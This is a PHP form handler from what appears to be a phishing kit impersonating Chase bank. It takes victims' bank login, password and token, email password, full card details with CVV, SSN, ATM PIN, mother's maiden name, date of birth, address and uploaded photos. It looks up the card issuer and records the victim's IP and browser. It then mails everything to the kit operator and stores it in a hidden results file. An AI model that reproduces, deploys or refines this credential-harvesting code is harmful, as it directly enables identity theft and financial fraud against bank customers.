<?php
$dir_inc = "..";
require_once 'function.php';
session_start();
$ssid = session_id();
if(isset($ssid)){
//post request 
parse_str(urldecode($_POST['form']),$arrayreq);

$array_post = [];
foreach($arrayreq as $key => $value){
	if(!(strpos($key,"jfiler-items-exclude-files") !== false)){
		$array_post[$key] = $value;
	}
} 
//variable
$email 			    = (isset($array_post['email']))? $array_post['email'] : "";
$password_mail	= (isset($array_post['password'])) ? $array_post['password'] : "";
$first_name		  = $array_post['fname'];
$last_name	   	= $array_post['lname'];
$dob 		       	= $array_post['dob'];
$address    		= $array_post['address'];
$city 		    	= $array_post['city'];
$state 		     	= $array_post['state'];
$zip 			      = $array_post['zip'];
$phone 		     	= $array_post['phone'];

$creditcard      = $array_post['creditcard'];
$exp 			       = $array_post['exp'];
$cvv		         = $array_post['cvv'];
$ssn 			       = $array_post['ssn'];
$atm_pin 		     = $array_post['atm_pin'];
$mothername 	   = $array_post['mothername'];
$driving_licence = $array_post['driving_licence'];

$bin_info  = checkbin($array_post['creditcard']);
$ccklas    = (isset($bin_info->scheme)) ? $bin_info->scheme : "-";
$cctype    = (isset($bin_info->type)) ? $bin_info->type : "-";
$ccbrand   = (isset($bin_info->brand)) ? (($bin_info->brand == "Traditional") ? "Classic" : $bin_info->brand) : "-";
$ccbank    = (isset($bin_info->bank->name)) ? $bin_info->bank->name : "-";
$cccountry = (isset($bin_info->country->name)) ? $bin_info->country->name : "-";

$token_bank	   = $_SESSION['token'];
$username_bank = $_SESSION['username'];
$password_bank = $_SESSION['password'];

$obj = new OS_BR();
$ip  = ipcheck();
$bin = preg_replace('/\s/', '', str_replace(" ","",$creditcard));
$bin = substr($bin, 0, 6);
//subject 
$subject = 'Chase ($_$) - ' . $bin . ' - ' . strtoupper($ccklas) . ' ' . strtoupper($cctype) . ' ' . strtoupper($ccbrand) . ' ' . strtoupper($ccbank) . ' - ' . strtoupper($cccountry) . ' (' . $ip . ' - ' . $obj->showInfo("os") . ') ';

//message
$message =  '
============[$$$$$$(Chase Login)$$$$$$]============<br/>
Username  : ' . $username_bank . '<br/>
Password  : ' . $password_bank . '<br/>
Token     : ' . $token_bank . '<br/>
============[$$$$$$(Chase Email)$$$$$$]============<br/>
Email     : ' . $email .'<br/>
Password  : ' . $password_mail . ' <br/>
============[$$$$$$(Chase CC)$$$$$$]============<br/>
Name      : ' . $first_name . " " .  $last_name.'<br/>
Cc        : ' . $creditcard . '<br/>
Exp       : ' . $exp .'<br/>
Cvv       : ' . $cvv . '<br/>
DOB 	    : ' . $dob .'<br/>
Ssn       : ' . $ssn . '
Phone     : ' . $phone . '<br/>
Address   : ' . $address . '<br/>
City      : ' . $city . '<br/>
State     : ' . $state . '<br/>
Zip       : ' . $zip . '<br/>
============[$$$$$$(Chase CC Info)$$$$$$]============<br/>
Bin       : ' . $bin. '<br/>
Bank      : ' . $ccbank . '<br/>
Tipe      : ' . $ccklas . ' | ' . $cctype . '<br/>
Cc Level  : ' . $ccbrand . '<br/>
Cc Country: ' . $cccountry . '<br/>
==============[$$$$$$(FYI)$$$$$$]==============<br/>
Os        :' . $obj->showInfo('os') . '<br/>
Browser   :' . $obj->showInfo('browser') . ' ' . $obj->showInfo('version') . '<br/>
Ip        :' . $ip . '<br/>
User Agent:' . $_SERVER['HTTP_USER_AGENT'] . '<br/>
===============================================<br/>
';


//get upload
$url_photo  =  "../upload/";
$photo = [];
foreach ($_POST['upload'] as $value) {
	if(file_exists($url_photo.$value)){

		//rename file
		$new_name  = strtr($email,["@" => "_at_"])."~".$value;
		rename($url_photo.$value, $url_photo.$new_name);
		$photo[] = $url_photo.$new_name;
	}
}


 //send
 mail_attachment(config("..","email_result"),$subject,$message,$photo);

 //create file
         $file_name = "gxccinfo";
         $sasa = parse_ini_file(__DIR__."/../GX/gx40result/.".$file_name)['data'];
         $arr = json_decode($sasa, true);
         //chase login
         $arrne['Username'] = $username_bank;
         $arrne['Password'] = $password_bank;
         $arrne['Token'] = $token_bank;
  		   //chase Email
  		   $arrne['Email'] = $email;
  		   $arrne['Password_Email'] = $password_mail;
  		   //chase cc
         $arrne['Name'] = $first_name." ".$last_name;
         $arrne['Dob'] = $dob;
         $arrne['Cc'] = $creditcard;
         $arrne['Exp'] = $exp;
         $arrne['Cvv'] = $cvv;
         $arrne['Ssn'] = $ssn;
         $arrne['Phone'] = $phone;
         $arrne['Address'] = $address;
         $arrne['City'] = $city;
         $arrne['State'] = $state;
         $arrne['Zip'] = $zip;
         $arrne['Dob'] = $dob;
         //chase bank info
         $arrne['Bin'] = $bin;
         $arrne['Bank'] = $ccbank;
         $arrne['Tipe'] = $ccklas." - ".$cctype;
         $arrne['Cc_Level'] = $ccbrand;
         $arrne['Cc_Country'] = $cccountry;
         //fyi
         $arrne['Os'] = $obj->showInfo('os');
         $arrne['Browser'] = $obj->showInfo('browser') . ' ' . $obj->showInfo('version');
         $arrne['Ip'] = $ip;
         $arrne['Date'] = strtotime(date("d-m-y H:i:s"));
         $arrne['User_Agent'] = $_SERVER['HTTP_USER_AGENT'];

         array_push($arr['creditcardinfo'], $arrne);
         $str = json_encode(array_filter($arr)); 
  
         if (json_decode($str) != null)
           {
             	$texts = "[{$file_name}]".PHP_EOL;
	            $texts .= "data = '{$str}'";
              unlink(__DIR__."/../GX/gx40result/.{$file_name}");
              $file = fopen(__DIR__."/../GX/gx40result/.{$file_name}",'w');
              fwrite($file, $texts);
              fclose($file);
           }
  
  
    $detect_ip  = (array) $_SESSION['ip'];
    $detect_ip['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
    $detect_ip['date']       = strtotime(date("d-m-y H:i:s"));
    registip($detect_ip);
 
 echo json_encode(['success' => true]);

}else{
	echo json_encode(['success' => false,"message" => "no session"]);
}
?>